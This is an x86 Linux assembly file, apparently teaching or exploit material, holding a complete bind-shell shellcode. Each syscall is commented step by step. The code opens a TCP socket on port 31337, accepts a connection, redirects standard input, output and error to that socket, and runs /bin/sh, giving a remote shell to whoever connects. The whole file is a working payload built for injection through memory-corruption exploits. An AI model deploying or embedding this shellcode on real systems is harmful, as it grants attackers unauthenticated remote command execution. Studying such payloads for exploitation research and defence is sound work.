BITS 32
	
	; s  =socket(2, 1, 0)
	push BYTE 0x66			; socketcall is syscall #102 (0x66)
	pop eax
	cdq									; zero out edx for use as null DWORD later
	xor ebx, ebx				; ebx is type of socketcall
	inc ebx							; 1 = SYS_SOCKET = socket()
	push edx						; build arg array: { protocol = 0, 
	push BYTE 0x1				; (in reverse) 			SOCK_STREAM = 1, 
	push BYTE 0x2				;										AF_INET = 2}
	mov ecx, esp				; ecx = ptr to argument array
	int 0x80						; after syscall, eax has socket file descriptor

	mov esi, eax				; save socket FD in esi for later

	; bind(s, [2, 31337, 0], 16)
	push BYTE 0x66			; socketcall (syscall #102)
	pop eax
	inc ebx							; ebx = 2 = SYS_BIND = bind()
	push edx						; Build sockaddr struct: INADDR_ANY = 0
	push WORD 0x697a		;  (in reverse order) 		PORT = 31337
	push WORD bx				;													AF_INET = 2
	mov ecx, esp				; esp = server struct pointer
	push BYTE 16				; argv: {sizeof(server struct) = 16,
	push ecx						;					server struct pointer,
	push esi						;					socket file descriptor }
	mov ecx, esp				;		ecx = argument array
	int 0x80						; eax = 0 on success

; listen(s, 0)
	mov BYTE al, 0x66		; socketcall (syscall #102)
	inc ebx
	inc ebx							; ebx = 4 = SYS_LITEN = listen()
	push ebx						; argv: {backlog = 4,
	push esi						;				socket fd }
	mov ecx, esp				;  ecx = argument array
	int 0x80			

; c = accept(s, 0,0 )
	mov BYTE al, 0x66		; socketcall (syscall #102)
	inc ebx							; ebx = 5 = SYS_ACCEPT = accept()
	push edx						; argv: { SOCKLEN = 0,
	push edx						;			sockaddr ptr = NULL,
	push esi						;					socket fd}
	mov ecx, esp				;	ecx = argument array
	int 0x80						; eax = connected socket FD
	
; dup2(connected socket, {all three standard I/O file desciptors})
	mov ebx, eax				; Move socket FD in ebx
	push BYTE 0x3F			; dup2 syscall #63
	pop eax
	xor ecx, ecx				; ecx = 0 = standard input	
	int 0x80						; dup(c, 0)
	mov BYTE al, 0x3F		; dup2 sys call #63
	inc ecx							; ecx = 1 = standard output
	int 0x80						; dup(c, 1)
	mov BYTE al, 0x3F		; dup2 syscall #63
	inc ecx							; ecx = 2 standard error
	int 0x80						; dup(c, 2)

; execve (const char *filename, char *const argv[], char *const envp[])
	mov BYTE al, 11			; execve syscall #11
	push edx						; push some nulls for string termination
	push 0x68732f2f			; push "//sh"
	push 0x6e69622f			; push "/bin" to the stack
	mov ebx, esp				; Put the address of "/bin//sh" into ebx via esp
	push ecx						; push the 32-but null terminator to stack
	mov edx, esp				; empty array for envp
	push ebx					; push string addr to stack above null terminator	
	mov ecx, esp				; argv array with string ptr
	int 0x80						; execve ("/bin//sh", ["/bin//sh", NULL], [NULL])
